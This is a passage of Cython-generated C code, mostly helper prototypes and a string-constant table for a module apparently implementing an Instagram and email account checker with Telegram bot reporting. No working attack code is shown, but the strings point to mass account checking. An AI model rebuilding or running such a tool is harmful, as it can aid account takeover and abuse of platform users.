#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* IncludeStringH.proto */
#include <string.h>

/* BytesEquals.proto */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals);

/* UnicodeEquals.proto */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals);

/* PyObjectCall2Args.proto */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);

/* None.proto */
static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname);

/* RaiseArgTupleInvalid.proto */
static void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,
    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);

/* RaiseDoubleKeywords.proto */
static void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);

/* ParseKeywords.proto */
static int __Pyx_ParseOptionalKeywords(PyObject *kwds, PyObject **argnames[],\
    PyObject *kwds2, PyObject *values[], Py_ssize_t num_pos_args,\
    const char* function_name);

/* PyObjectFormatSimple.proto */
#if CYTHON_COMPILING_IN_PYPY
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#elif PY_MAJOR_VERSION < 3
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyString_CheckExact(s)) ? PyUnicode_FromEncodedObject(s, NULL, "strict") :\
        PyObject_Format(s, f))
#elif CYTHON_USE_TYPE_SLOTS
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyLong_CheckExact(s)) ? PyLong_Type.tp_str(s) :\
        likely(PyFloat_CheckExact(s)) ? PyFloat_Type.tp_str(s) :\
        PyObject_Format(s, f))
#else
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#endif

/* JoinPyUnicode.proto */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      Py_UCS4 max_char);

/* PyErrExceptionMatches.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);
#else
#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)
#endif

/* SwapException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSwap(type, value, tb)  __Pyx__ExceptionSwap(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* PySequenceContains.proto */
static CYTHON_INLINE int __Pyx_PySequence_ContainsTF(PyObject* item, PyObject* seq, int eq) {
    int result = PySequence_Contains(seq, item);
    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));
}

/* PyUnicodeContains.proto */
static CYTHON_INLINE int __Pyx_PyUnicode_ContainsTF(PyObject* substring, PyObject* text, int eq) {
    int result = PyUnicode_Contains(text, substring);
    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));
}

/* PyIntBinop.proto */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);
#else
#define __Pyx_PyInt_AddObjC(op1, op2, intval, inplace, zerodivision_check)\
    (inplace ? PyNumber_InPlaceAdd(op1, op2) : PyNumber_Add(op1, op2))
#endif

/* DictGetItem.proto */
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key);
#define __Pyx_PyObject_Dict_GetItem(obj, name)\
    (likely(PyDict_CheckExact(obj)) ?\
     __Pyx_PyDict_GetItem(obj, name) : PyObject_GetItem(obj, name))
#else
#define __Pyx_PyDict_GetItem(d, key) PyObject_GetItem(d, key)
#define __Pyx_PyObject_Dict_GetItem(obj, name)  PyObject_GetItem(obj, name)
#endif

/* GetItemInt.proto */
#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\
    (is_list ? (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL) :\
               __Pyx_GetItemInt_Generic(o, to_py_func(i))))
#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "tuple index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,
                                                     int is_list, int wraparound, int boundscheck);

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* ImportFrom.proto */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name);

/* ListAppend.proto */
#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS
static CYTHON_INLINE int __Pyx_PyList_Append(PyObject* list, PyObject* x) {
    PyListObject* L = (PyListObject*) list;
    Py_ssize_t len = Py_SIZE(list);
    if (likely(L->allocated > len) & likely(len > (L->allocated >> 1))) {
        Py_INCREF(x);
        PyList_SET_ITEM(list, len, x);
        __Pyx_SET_SIZE(list, len + 1);
        return 0;
    }
    return PyList_Append(list, x);
}
#else
#define __Pyx_PyList_Append(L,x) PyList_Append(L,x)
#endif

/* PyObjectGetMethod.proto */
static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method);

/* PyObjectCallMethod1.proto */
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg);

/* append.proto */
static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x);

/* FetchCommonType.proto */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);

/* CythonFunctionShared.proto */
#define __Pyx_CyFunction_USED 1
#define __Pyx_CYFUNCTION_STATICMETHOD  0x01
#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02
#define __Pyx_CYFUNCTION_CCLASS        0x04
#define __Pyx_CyFunction_GetClosure(f)\
    (((__pyx_CyFunctionObject *) (f))->func_closure)
#define __Pyx_CyFunction_GetClassObj(f)\
    (((__pyx_CyFunctionObject *) (f))->func_classobj)
#define __Pyx_CyFunction_Defaults(type, f)\
    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))
#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\
    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)
typedef struct {
    PyCFunctionObject func;
#if PY_VERSION_HEX < 0x030500A0
    PyObject *func_weakreflist;
#endif
    PyObject *func_dict;
    PyObject *func_name;
    PyObject *func_qualname;
    PyObject *func_doc;
    PyObject *func_globals;
    PyObject *func_code;
    PyObject *func_closure;
    PyObject *func_classobj;
    void *defaults;
    int defaults_pyobjects;
    size_t defaults_size;  // used by FusedFunction for copying defaults
    int flags;
    PyObject *defaults_tuple;
    PyObject *defaults_kwdict;
    PyObject *(*defaults_getter)(PyObject *);
    PyObject *func_annotations;
} __pyx_CyFunctionObject;
static PyTypeObject *__pyx_CyFunctionType = 0;
#define __Pyx_CyFunction_Check(obj)  (__Pyx_TypeCheck(obj, __pyx_CyFunctionType))
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *self,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,
                                                         size_t size,
                                                         int pyobjects);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,
                                                            PyObject *tuple);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,
                                                             PyObject *dict);
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,
                                                              PyObject *dict);
static int __pyx_CyFunction_init(void);

/* CythonFunction.proto */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *closure,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);

/* SetNameInClass.proto */
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
#define __Pyx_SetNameInClass(ns, name, value)\
    (likely(PyDict_CheckExact(ns)) ? _PyDict_SetItem_KnownHash(ns, name, value, ((PyASCIIObject *) name)->hash) : PyObject_SetItem(ns, name, value))
#elif CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_SetNameInClass(ns, name, value)\
    (likely(PyDict_CheckExact(ns)) ? PyDict_SetItem(ns, name, value) : PyObject_SetItem(ns, name, value))
#else
#define __Pyx_SetNameInClass(ns, name, value)  PyObject_SetItem(ns, name, value)
#endif

/* CalculateMetaclass.proto */
static PyObject *__Pyx_CalculateMetaclass(PyTypeObject *metaclass, PyObject *bases);

/* Py3ClassCreate.proto */
static PyObject *__Pyx_Py3MetaclassPrepare(PyObject *metaclass, PyObject *bases, PyObject *name, PyObject *qualname,
                                           PyObject *mkw, PyObject *modname, PyObject *doc);
static PyObject *__Pyx_Py3ClassCreate(PyObject *metaclass, PyObject *name, PyObject *bases, PyObject *dict,
                                      PyObject *mkw, int calculate_metaclass, int allow_py2_metaclass);

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'source' */
#define __Pyx_MODULE_NAME "source"
extern int __pyx_module_is_main_source;
int __pyx_module_is_main_source = 0;

/* Implementation of 'source' */
static PyObject *__pyx_builtin_BaseException;
static PyObject *__pyx_builtin_print;
static PyObject *__pyx_builtin_input;
static PyObject *__pyx_builtin_open;
static PyObject *__pyx_builtin_ValueError;
static PyObject *__pyx_builtin_range;
static const char __pyx_k_0[] = "{:.0%}";
static const char __pyx_k_1[] = "?1";
static const char __pyx_k_2[] = "2";
static const char __pyx_k_3[] = "3";
static const char __pyx_k_4[] = "4";
static const char __pyx_k_A[] = "A";
static const char __pyx_k_B[] = "B";
static const char __pyx_k_C[] = "C";
static const char __pyx_k_E[] = "E";
static const char __pyx_k_F[] = "F";
static const char __pyx_k_G[] = "G";
static const char __pyx_k_K[] = "K";
static const char __pyx_k_M[] = "M";
static const char __pyx_k_O[] = "O";
static const char __pyx_k_Q[] = "Q";
static const char __pyx_k_R[] = "R";
static const char __pyx_k_S[] = "S";
static const char __pyx_k_U[] = "U";
static const char __pyx_k_V[] = "V";
static const char __pyx_k_X[] = "X";
static const char __pyx_k_Y[] = "Y";
static const char __pyx_k_Z[] = "Z";
static const char __pyx_k_a[] = "a";
static const char __pyx_k_b[] = "b";
static const char __pyx_k_e[] = "e";
static const char __pyx_k_f[] = "f";
static const char __pyx_k_i[] = "i";
static const char __pyx_k_o[] = "o";
static const char __pyx_k_p[] = "p";
static const char __pyx_k_r[] = "r+";
static const char __pyx_k_s[] = "s";
static const char __pyx_k_t[] = "t";
static const char __pyx_k_u[] = "u";
static const char __pyx_k_w[] = "w";
static const char __pyx_k_x[] = "x";
static const char __pyx_k_y[] = "y";
static const char __pyx_k_z[] = "z";
static const char __pyx_k_38[] = "38";
static const char __pyx_k_BL[] = "BL";
static const char __pyx_k_C1[] = "C1";
static const char __pyx_k_DS[] = "DS";
static const char __pyx_k_Id[] = "Id";
static const char __pyx_k_YU[] = "YU";
static const char __pyx_k_Z1[] = "Z1";
static const char __pyx_k__3[] = "\r\t ";
static const char __pyx_k__4[] = "-[";
static const char __pyx_k__5[] = "-";
static const char __pyx_k__6[] = "]";
static const char __pyx_k__7[] = "\342\200\242";
static const char __pyx_k__8[] = "\r";
static const char __pyx_k__9[] = "";
static const char __pyx_k_fj[] = "fj";
static const char __pyx_k_id[] = "id";
static const char __pyx_k_ip[] = "\",\"ip\":\"";
static const char __pyx_k_nt[] = "nt";
static const char __pyx_k_os[] = "os";
static const char __pyx_k_re[] = "re";
static const char __pyx_k_rr[] = "rr";
static const char __pyx_k_sg[] = "sg";
static const char __pyx_k_0_2[] = "?0";
static const char __pyx_k_0_3[] = "0";
static const char __pyx_k_0_8[] = "0.8";
static const char __pyx_k_1_2[] = "1";
static const char __pyx_k_30m[] = "\033[30m";
static const char __pyx_k_364[] = "364";
static const char __pyx_k_393[] = "393";
static const char __pyx_k_624[] = "624";
static const char __pyx_k_B_2[] = "B_";
static const char __pyx_k_Hit[] = "Hit";
static const char __pyx_k_Lol[] = "{Lol}";
static const char __pyx_k__10[] = "*/*";
static const char __pyx_k__12[] = "\"}";
static const char __pyx_k__13[] = "\"\330\252\331\205 \330\245\330\261\330\263\330\247\331\204 \330\247\331\204\330\250\330\261\331\212\330\257 \330\247\331\204\330\245\331\204\331\203\330\252\330\261\331\210\331\206\331\212\"";
static const char __pyx_k__14[] = " \360\223\212\206\360\235\220\264\360\235\220\266\360\235\220\266\360\235\221\202\360\235\221\210\360\235\221\201\360\235\221\207 \360\235\220\274\360\235\221\201\360\235\221\206\360\235\221\207\360\235\220\264\360\235\220\272\360\235\221\205\360\235\220\264\360\235\221\200\360\223\212\207\n\342\213\230\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\201\360\235\220\223\360\235\220\207\360\235\220\216\360\235\220\214\360\235\220\200\360\235\220\222\342\224\201\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\213\231\n\360\237\207\271\360\237\207\267\360\235\220\207\360\235\220\210\360\235\220\223: ";
static const char __pyx_k__15[] = "\n\360\237\207\271\360\237\207\267\360\235\220\210\360\235\220\222\360\235\220\210\360\235\220\214 : ";
static const char __pyx_k__16[] = "\n\360\237\207\271\360\237\207\267\360\235\220\212\360\235\220\224\360\235\220\213\360\235\220\213\360\235\220\200\360\235\220\215\360\235\220\210\360\235\220\202\360\235\220\210 \360\235\220\200\360\235\220\203\360\235\220\210: ";
static const char __pyx_k__17[] = "\n\360\237\207\271\360\237\207\267\360\235\220\204\360\235\220\214\360\235\220\200\360\235\220\210\360\235\220\213 : ";
static const char __pyx_k__18[] = "\n\360\237\207\271\360\237\207\267\360\235\220\223\360\235\220\200\360\235\220\212\360\235\220\210\360\235\220\217\360\235\220\202\360\235\220\210:  ";
static const char __pyx_k__19[] = "\n\360\237\207\271\360\237\207\267\360\235\220\223\360\235\220\200\360\235\220\212\360\235\220\210\360\235\220\217:  ";
static const char __pyx_k__20[] = "\n\360\237\207\271\360\237\207\267\360\235\220\223\360\235\220\200\360\235\220\221\360\235\220\210\360\235\220\207: ";
static const char __pyx_k__21[] = "\n\360\237\207\271\360\237\207\267\360\235\220\221\360\235\220\204\360\235\220\222\360\235\220\223: ";
static const char __pyx_k__22[] = "\n\360\237\207\271\360\237\207\267\360\235\220\201\360\235\220\210\360\235\220\216:  ";
static const char __pyx_k__23[] = "\n\360\237\207\271\360\237\207\267\360\235\220\210\360\235\220\203:  ";
static const char __pyx_k__24[] = "\n\360\223\212\206\360\235\220\264\360\235\220\266\360\235\220\266\360\235\221\202\360\235\221\210\360\235\221\201\360\235\221\207 \360\235\220\274\360\235\221\201\360\235\221\206\360\235\221\207\360\235\220\264\360\235\220\272\360\235\221\205\360\235\220\264\360\235\221\200\360\223\212\207\n\342\213\230\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\224\201\360\235\220\223\360\235\220\207\360\235\220\216\360\235\220\214\360\235\220\200\360\235\220\222\342\224\201\342\224\200\342\224\200\342\224\200\342\224\200\342\224\200\342\213\231\n\360\237\207\271\360\237\207\267\360\235\220\207\360\235\220\210\360\235\220\223: ";
static const char __pyx_k__25[] = "\n\360\237\207\271\360\237\207\267\360\235\220\204\360\235\220\214\360\235\220\200\360\235\220\210\360\235\220\213 - ";
static const char __pyx_k__27[] = "\":\"";
static const char __pyx_k__33[] = "\n";
static const char __pyx_k__48[] = "______________________________";
static const char __pyx_k_ada[] = "ada";
static const char __pyx_k_bio[] = "bio";
static const char __pyx_k_blo[] = "blo";
static const char __pyx_k_brt[] = "brt";
static const char __pyx_k_chk[] = "chk";
static const char __pyx_k_cls[] = "cls";
static const char __pyx_k_cok[] = "cok";
static const char __pyx_k_com[] = "com";
static const char __pyx_k_dnt[] = "dnt";
static const char __pyx_k_doc[] = "__doc__";
static const char __pyx_k_dom[] = "dom";
static const char __pyx_k_dpr[] = "dpr";
static const char __pyx_k_end[] = "end";
static const char __pyx_k_fol[] = "fol";
static const char __pyx_k_get[] = "get";
static const char __pyx_k_gm1[] = "gm1";
static const char __pyx_k_gm2[] = "gm2";
static const char __pyx_k_grn[] = "grn";
static const char __pyx_k_ids[] = "ids";
static const char __pyx_k_lic[] = "lic";
static const char __pyx_k_md5[] = "md5";
static const char __pyx_k_mkt[] = "mkt";
static const char __pyx_k_now[] = "now";
static const char __pyx_k_r_2[] = "r";
static const char __pyx_k_red[] = "red";
static const char __pyx_k_req[] = "req";
static const char __pyx_k_url[] = "url";
static const char __pyx_k_use[] = "use";
static const char __pyx_k_xhr[] = "xhr";
static const char __pyx_k_1001[] = "1001";
static const char __pyx_k_BRed[] = "BRed";
static const char __pyx_k_Host[] = "Host";
static const char __pyx_k_Lock[] = "Lock";
static const char __pyx_k_MUID[] = "MUID";
static const char __pyx_k_Text[] = "Text";
static const char __pyx_k_WIFI[] = "WIFI";
static const char __pyx_k_amsc[] = "amsc";
static const char __pyx_k_blue[] = "blue";
static const char __pyx_k_clrc[] = "clrc";
static const char __pyx_k_cors[] = "cors";
static const char __pyx_k_dark[] = "dark";
static const char __pyx_k_data[] = "data";
static const char __pyx_k_date[] = "date";
static const char __pyx_k_exit[] = "__exit__";
static const char __pyx_k_fols[] = "fols";
static const char __pyx_k_haha[] = "haha";
static const char __pyx_k_init[] = "__init__";
static const char __pyx_k_ins1[] = "ins1";
static const char __pyx_k_ins2[] = "ins2";
static const char __pyx_k_json[] = "json";
static const char __pyx_k_loob[] = "loob";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_mkt1[] = "mkt1";
static const char __pyx_k_name[] = "name";
static const char __pyx_k_open[] = "open";
static const char __pyx_k_orde[] = "orde";
static const char __pyx_k_post[] = "post";
static const char __pyx_k_rest[] = "rest";
static const char __pyx_k_rich[] = "rich";
static const char __pyx_k_rule[] = "rule";
static const char __pyx_k_scid[] = "scid";
static const char __pyx_k_self[] = "self";
static const char __pyx_k_tcxt[] = "tcxt";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_text[] = "text";
static const char __pyx_k_time[] = "time";
static const char __pyx_k_true[] = "true";
static const char __pyx_k_uaid[] = "uaid";
static const char __pyx_k_user[] = "user";
static const char __pyx_k_uuid[] = "uuid";
static const char __pyx_k_yalo[] = "yalo";
static const char __pyx_k_1_000[] = "-1.000";
static const char __pyx_k_1_31m[] = "\033[1;31m";
static const char __pyx_k_1_32m[] = "\033[1;32m";
static const char __pyx_k_1_33m[] = "\033[1;33m";
static const char __pyx_k_1_34m[] = "\033[1;34m";
static const char __pyx_k_1_35m[] = "\033[1;35m";
static const char __pyx_k_1_36m[] = "\033[1;36m";
static const char __pyx_k_1_37m[] = "\033[1;37m";
static const char __pyx_k_1_39m[] = "\033[1;39m\342\200\224";
static const char __pyx_k_1_97m[] = "\033[1;97m";
static const char __pyx_k_1kbps[] = "-1kbps";
static const char __pyx_k_2_31m[] = "\033[2;31m";
static const char __pyx_k_2_32m[] = "\033[2;32m";
static const char __pyx_k_2_34m[] = "\033[2;34m";
static const char __pyx_k_2_35m[] = "\033[2;35m";
static const char __pyx_k_2_36m[] = "\033[2;36m";
static const char __pyx_k_3_33m[] = "\033[3;33m";
static const char __pyx_k_AR_AR[] = "AR-AR";
static const char __pyx_k_BCyan[] = "BCyan";
static const char __pyx_k_ERROR[] = "ERROR!!";
static const char __pyx_k_Faker[] = "Faker";
static const char __pyx_k_Liger[] = "Liger";
static const char __pyx_k_Panel[] = "Panel";
static const char __pyx_k_Sajad[] = "Sajad";
static const char __pyx_k_align[] = "align";
static const char __pyx_k_ar_AR[] = "ar-AR";
static const char __pyx_k_ar_YE[] = "ar-YE";
static const char __pyx_k_blodk[] = "blodk";
static const char __pyx_k_clear[] = "clear";
static const char __pyx_k_com_A[] = "com.A";
static const char __pyx_k_count[] = "count";
static const char __pyx_k_datet[] = "datet";
static const char __pyx_k_domin[] = "domin";
static const char __pyx_k_email[] = "email";
static const char __pyx_k_empty[] = "empty";
static const char __pyx_k_enter[] = "__enter__";
static const char __pyx_k_error[] = "error";
static const char __pyx_k_faker[] = "faker";
static const char __pyx_k_false[] = "false";
static const char __pyx_k_hpgid[] = "hpgid";
static const char __pyx_k_idtle[] = "idtle";
static const char __pyx_k_input[] = "input";
static const char __pyx_k_lines[] = "lines";
static const char __pyx_k_okhot[] = "okhot";
static const char __pyx_k_okout[] = "okout";
static const char __pyx_k_print[] = "print";
static const char __pyx_k_range[] = "range";
static const char __pyx_k_secim[] = "secim";
static const char __pyx_k_sleep[] = "sleep";
static const char __pyx_k_split[] = "split";
static const char __pyx_k_start[] = "start";
static const char __pyx_k_strip[] = "strip";
static const char __pyx_k_token[] = "token";
static const char __pyx_k_trunk[] = "trunk";
static const char __pyx_k_uuid4[] = "uuid4";
static const char __pyx_k_white[] = "white";
static const char __pyx_k_write[] = "write";
static const char __pyx_k_100118[] = "100118";
static const char __pyx_k_10_0_0[] = "\"10.0.0\"";
static const char __pyx_k_129477[] = "129477";
static const char __pyx_k_13_0_0[] = "\"13.0.0\"";
static const char __pyx_k_200639[] = "200639";
static const char __pyx_k_3brTvw[] = "3brTvw==";
static const char __pyx_k_Accept[] = "Accept";
static const char __pyx_k_BGreen[] = "BGreen";
static const char __pyx_k_BWhite[] = "BWhite";
static const char __pyx_k_Canary[] = "Canary";
static const char __pyx_k_Cookie[] = "Cookie";
static const char __pyx_k_THOMAS[] = "THOMAS";
static const char __pyx_k_Thread[] = "Thread";
static const char __pyx_k_accept[] = "accept";
static const char __pyx_k_append[] = "append";
static const char __pyx_k_badhot[] = "badhot";
static const char __pyx_k_badout[] = "badout";
static const char __pyx_k_canary[] = "canary";
static const char __pyx_k_center[] = "center";
static const char __pyx_k_cfonts[] = "cfonts";
static const char __pyx_k_choice[] = "choice";
static const char __pyx_k_colors[] = "colors";
static const char __pyx_k_decode[] = "decode";
static const char __pyx_k_doc_id[] = "doc_id";
static const char __pyx_k_encode[] = "encode";
static const char __pyx_k_format[] = "format";
static const char __pyx_k_get_id[] = "get_id";
static const char __pyx_k_heedrs[] = "heedrs";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_module[] = "__module__";
static const char __pyx_k_name_2[] = "__name__";
static const char __pyx_k_origin[] = "origin";
static const char __pyx_k_output[] = "output";
static const char __pyx_k_params[] = "params";
static const char __pyx_k_random[] = "random";
static const char __pyx_k_remove[] = "remove";
static const char __pyx_k_render[] = "render";
static const char __pyx_k_source[] = "source";
static const char __pyx_k_spin_b[] = "__spin_b";
static const char __pyx_k_status[] = "\",\"status\":\"";
static const char __pyx_k_submit[] = "submit";
static const char __pyx_k_system[] = "system";
static const char __pyx_k_target[] = "target";
static const char __pyx_k_text_2[] = "&text=";
static const char __pyx_k_uiflvr[] = "uiflvr";
static const char __pyx_k_userID[] = "{\"userID\":\"";
static const char __pyx_k_1_39m_2[] = "\033[1;39m";
static const char __pyx_k_Android[] = "\"Android\"";
static const char __pyx_k_BPurple[] = "BPurple";
static const char __pyx_k_BYellow[] = "BYellow";
static const char __pyx_k_Console[] = "Console";
static const char __pyx_k_Kt_mail[] = "K\303\266t\303\274 mail";
static const char __pyx_k_Referer[] = "Referer";
static const char __pyx_k_Windows[] = "\"Windows\"";
static const char __pyx_k_badmain[] = "badmain";
static const char __pyx_k_chkfile[] = "chkfile";
static const char __pyx_k_com_blo[] = "com.blo";
static const char __pyx_k_com_brt[] = "com.brt";
static const char __pyx_k_com_grn[] = "com.grn";
static const char __pyx_k_com_red[] = "com.red";
static const char __pyx_k_console[] = "console";
static const char __pyx_k_cookies[] = "cookies";
static const char __pyx_k_email_2[] = "\"email\":\"";
static const char __pyx_k_encoded[] = "encoded";
static const char __pyx_k_getcnre[] = "getcnre";
static const char __pyx_k_hashlib[] = "hashlib";
static const char __pyx_k_headers[] = "headers";
static const char __pyx_k_prepare[] = "__prepare__";
static const char __pyx_k_referer[] = "referer";
static const char __pyx_k_secrets[] = "secrets";
static const char __pyx_k_2_39_40m[] = "\033[2;39;40m";
static const char __pyx_k_38_5_21m[] = "\033[38;5;21m";
static const char __pyx_k_Kt_insta[] = "K\303\266t\303\274 insta";
static const char __pyx_k_ana_menu[] = "ana_menu";
static const char __pyx_k_badighot[] = "badighot";
static const char __pyx_k_badigout[] = "badigout";
static const char __pyx_k_badinsta[] = "badinsta";
static const char __pyx_k_colorama[] = "colorama";
static const char __pyx_k_com_orde[] = "com.orde";
static const char __pyx_k_com_yalo[] = "com.yalo";
static const char __pyx_k_datetime[] = "datetime";
static const char __pyx_k_dosyasil[] = "dosyasil";
static const char __pyx_k_executor[] = "executor";
static const char __pyx_k_filename[] = "filename";
static const char __pyx_k_get_dict[] = "get_dict";
static const char __pyx_k_infosand[] = "infosand";
static const char __pyx_k_namefile[] = "namefile";
static const char __pyx_k_qualname[] = "__qualname__";
static const char __pyx_k_requests[] = "requests";
static const char __pyx_k_response[] = "response";
static const char __pyx_k_tokenbot[] = "tokenbot";
static const char __pyx_k_username[] = "username";
static const char __pyx_k_38_5_200m[] = "\033[38;5;200m";
static const char __pyx_k_38_5_208m[] = "\033[38;5;208m";
static const char __pyx_k_Api_Aktif[] = "{}Api Aktif \342\234\205 {}";
static const char __pyx_k_Sajad_chk[] = "Sajad.chk";
static const char __pyx_k_Sec_Ch_Ua[] = "Sec-Ch-Ua";
static const char __pyx_k_X_Asbd_Id[] = "X-Asbd-Id";
static const char __pyx_k_authority[] = "authority";
static const char __pyx_k_biography[] = "biography";
static const char __pyx_k_com_blodk[] = "com.blodk";
static const char __pyx_k_csrftoken[] = "csrftoken";
static const char __pyx_k_full_name[] = "full_name";
static const char __pyx_k_hexdigest[] = "hexdigest";
static const char __pyx_k_infoprint[] = "infoprint";
static const char __pyx_k_mechanize[] = "mechanize";
static const char __pyx_k_metaclass[] = "__metaclass__";
static const char __pyx_k_nambrline[] = "nambrline";
static const char __pyx_k_randrange[] = "randrange";
static const char __pyx_k_readlines[] = "readlines";
static const char __pyx_k_rich_text[] = "rich.text";
static const char __pyx_k_sec_ch_ua[] = "sec-ch-ua";
static const char __pyx_k_source_py[] = "source.py";
static const char __pyx_k_threading[] = "threading";
static const char __pyx_k_token_hex[] = "token_hex";
static const char __pyx_k_user_file[] = "user_file";
static const char __pyx_k_variables[] = "variables";
